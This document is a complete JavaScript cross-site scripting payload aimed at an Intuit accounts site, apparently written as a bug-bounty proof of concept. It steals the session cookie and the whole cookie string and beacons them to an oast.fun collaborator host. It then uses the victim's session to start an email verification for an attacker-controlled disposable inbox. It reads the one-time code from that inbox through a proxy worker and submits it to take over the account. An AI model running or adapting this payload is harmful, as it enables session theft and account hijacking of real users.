(function(){
try{
var O='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun';
var W='https://atmeta-wildcard-monitor.nasseurpay.workers.dev/?url=';
var S='https://1secmail.com/api/v1/';
var out=[];

function gc(n){
var m=document.cookie.match(new RegExp('(?:^|;\\s*)'+n.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+'=([^;]*)'));
return m?decodeURIComponent(m[1]):''
}
function beacon(tag,data){(new Image).src=O+'/'+tag+'?d='+encodeURIComponent((data||'').substring(0,900))}
function render(){
try{
if(!document.body){document.documentElement.appendChild(document.createElement('body'))}
document.body.innerHTML='<pre style="font:13px monospace;background:#111;color:#0f0;padding:20px;white-space:pre-wrap">'+out.join('\n')+'</pre>';
}catch(e){}
}
function log(msg){out.push(msg);render()}

var session=gc('ius_session');
var visitorId=gc('ivid');
var flowId='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g,function(c){var r=Math.random()*16|0;return(c==='x'?r:r&3|8).toString(16)});

beacon('p16-start',session.substring(0,30));
(new Image).src=O+'/p16-cookies?c='+encodeURIComponent(document.cookie.substring(0,2000));

var login='xpoc'+Math.random().toString(36).substr(2,8);
var domain='esiix.com';
var email=login+'@'+domain;

var hdrs={
'Content-Type':'application/json',
'authorization':'Intuit_APIKey intuit_apikey=prdakyres3YphxpI5f5NhtHOzVAHTTAuQmL8UmCB, intuit_apikey_version=1.0',
'intuit_sessionid':session,
'intuit_profilingid':session,
'intuit_visitorid':visitorId,
'intuit_flowid':flowId,
'intuit_offeringid':'Intuit.identity.experiences.oneintuitam',
'intuit_intentassetalias':'Intuit.identity.experiences.oneintuitam',
'intuit_origin':'https://accounts.intuit.com',
'intuit_country':'US',
'intuit_locale':'en-gb',
'intuit_offeringenv':'prd',
'intuit_authn_session_slot':'qbn',
'intuit_samesite_support':'true',
'intuit_identity_routing':'SBSEG',
'intuit_interception':'ignore-response',
'intuit_baggage':btoa(JSON.stringify({scope_area:'remediation',additional_fields:{}}))
};

log('[*] XSS on '+location.origin);
log('[*] Email: '+email);
log('');
log('[1] Calling initialize...');

fetch('/factors/v1/verifier/initialize/email',{
method:'POST',
headers:hdrs,
body:JSON.stringify({verifierPolicyId:'emailOtpSignIn',emailAddress:email}),
credentials:'include'
})
.then(function(r){return r.json()})
.then(function(data){
if(!data.verifierSessionId)throw new Error('no vsid: '+JSON.stringify(data));
var vsid=data.verifierSessionId;
log('[1] OK — vsid: '+vsid);
log('[1] OTP sent to: '+email);
beacon('p16-init',vsid);

log('');
log('[2] Polling for OTP via worker proxy...');

var attempt=0;
function poll(){
attempt++;
var url=S+'?action=getMessages&login='+login+'&domain='+domain;
return fetch(W+encodeURIComponent(url))
.then(function(r){
if(!r.ok)throw new Error('proxy status '+r.status);
return r.text()
})
.then(function(raw){
if(attempt<=3)beacon('p16-poll'+attempt,raw.substring(0,200));
log('[2] Poll #'+attempt+': '+raw.substring(0,80));
var msgs;
try{msgs=JSON.parse(raw)}catch(e){throw new Error('parse fail: '+raw.substring(0,80))}
if(!Array.isArray(msgs))throw new Error('not array: '+typeof msgs);
log('[2] '+msgs.length+' messages');
if(msgs.length>0){
log('[2] Got email! id='+msgs[0].id);
beacon('p16-mail','id='+msgs[0].id);
var ru=S+'?action=readMessage&login='+login+'&domain='+domain+'&id='+msgs[0].id;
return fetch(W+encodeURIComponent(ru))
.then(function(r2){if(!r2.ok)throw new Error('read status '+r2.status);return r2.text()})
.then(function(raw2){
var msg;try{msg=JSON.parse(raw2)}catch(e){throw new Error('msg parse: '+raw2.substring(0,80))}
return msg
})
}
if(attempt>=60)throw new Error('timeout');
return new Promise(function(res){setTimeout(function(){res(poll())},3000)})
})
}

return poll().then(function(msg){
var body=(msg.textBody||msg.body||msg.htmlBody||'');
log('[2] Subject: '+(msg.subject||'?'));
log('[2] Body: '+body.substring(0,200));
beacon('p16-body',body.substring(0,400));
var m=body.match(/\b(\d{6})\b/);
var otp=m?m[1]:null;
if(!otp){var m2=body.match(/\b(\d{4,8})\b/);otp=m2?m2[1]:null}
if(!otp)throw new Error('no OTP found in: '+body.substring(0,100));
log('[2] OTP: '+otp);
beacon('p16-otp',otp);

log('');
log('[3] Verifying OTP...');
return fetch('/factors/v1/verifier/verify/email',{
method:'POST',
headers:hdrs,
body:JSON.stringify({verifierSessionId:vsid,otp:otp}),
credentials:'include'
}).then(function(r3){return r3.text()}).then(function(b3){
log('[3] Response: '+b3);
beacon('p16-verify',b3);
log('');
log('=== EMAIL CHANGED TO: '+email+' ===');
beacon('p16-done','email='+email);
})
})
})
.catch(function(err){
log('[!] ERROR: '+err.message);
beacon('p16-err',err.message);
});

}catch(e){
(new Image).src='https://lywypcuxjraerrihkjpzz4w5umq5adhdw.oast.fun/p16-crash?e='+encodeURIComponent(e.message);
}
})();
